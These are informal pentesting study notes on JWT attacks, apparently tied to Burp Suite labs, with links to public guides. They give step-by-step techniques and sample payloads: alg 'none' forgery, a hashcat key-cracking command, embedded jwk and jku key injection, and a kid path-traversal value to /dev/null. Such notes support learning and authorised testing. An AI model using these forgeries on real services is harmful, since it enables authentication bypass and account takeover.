### JWT 
				    https://www.invicti.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/
 - Change claims, signature might not verified so u can access easily
 - change claims, change alg to none, remove signature except trailing dot, weak verification
 - Brute force signing key. `hashcat -a 0 -m 16500 <jwt> <wordlist>`. Wordlist https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list.  if it is cracked token:<key>. base64encode that key. in jwt edit, new symmetric key, generate, replace `k` with base64 encoded key, go back to repeater and sign
 - only "alg" key is compulsory, rest is optional. Devs use "jwk" ->  - Provides an embedded JSON object representing the key. 
	```json
	{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
	```
	Devs should whitelist keys to verify in the backend, if they just use the key in the jwk, then attacker could insert their own key.
	Steps:
		

   	 With the extension loaded, in Burp's main tab bar, go to the JWT Editor Keys tab.

   	 Generate a new RSA key.

    	Send a request containing a JWT to Burp Repeater.

    	In the message editor, switch to the extension-generated JSON Web Token tab and modify the token's payload however you like.

    	Click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key.

   	 Send the request to test how the server responds.


 - "jku", points to our custom exploit server, use the jwt editor burp plugin, generate, copy and paste to custom exploit server,
```json
{
    "keys":[
{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "d3818709-acea-4457-8946-58a9ac958d8b",
    "n": "hzcJ00KMoO6V1hN7MiwBuHVujFV4EmWnEs6SRSgVw0SQM60iV3HmJbbF69dC5hadgoN19QSa12ZCB41Jq7PGfx8cI1RE2WPiy7id8nFfmzKVuEtAVK-lDGfx89YWPOCRl1R7MTrU6lLO9zPbP2FWLpbNm0Ooj602JMgWEIWPz43llz4xgJOmYX8EQia9ntKeOs9-2vjL6OVWjdyR3i8JD0jiFvpQ8iY-ufEdVaRuBjaoeH5N_-dF3SNh7ccK5yoRvWAW9K2NKCrjpyL1wRql775Xdk93zBh9LVj4UBaAPo-NOv06hm1ixia-DI_h9V1Ef4wEbmXhO4ws1X1ahZb-kw"
}
    ]
}	
```
  when signing make sure "type":"jwt" is added, and remove "kid."
 - Servers may use several cryptographic keys for signing different kinds of data, not just JWTs. For this reason, the header of a JWT may contain a kid (Key ID) parameter, which helps the server identify which key to use when verifying the signature. 
	```json
	{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
	```
	Generate to generate a new key in JWK format. Replace the generated value for the k property with a Base64-encoded null byte (AA==).  ../../../../../../../dev/null .
 - make “alg”: “none”, make changes, and then Use an empty signature (i.e. signature = “”), has to have trailing dot.
 - https://pentestbook.six2dez.com/enumeration/webservices/jwt
 - https://kleiton0x00.github.io/posts/json-web-token-exploitation/
 - https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
 - https://github.com/sergioms/PentestJWT
 - https://medium.com/@netscylla/json-web-token-pentesting-890bc2cf0dcd
 - https://materials.rangeforce.com/tutorial/2019/05/29/Breaking-JWTs/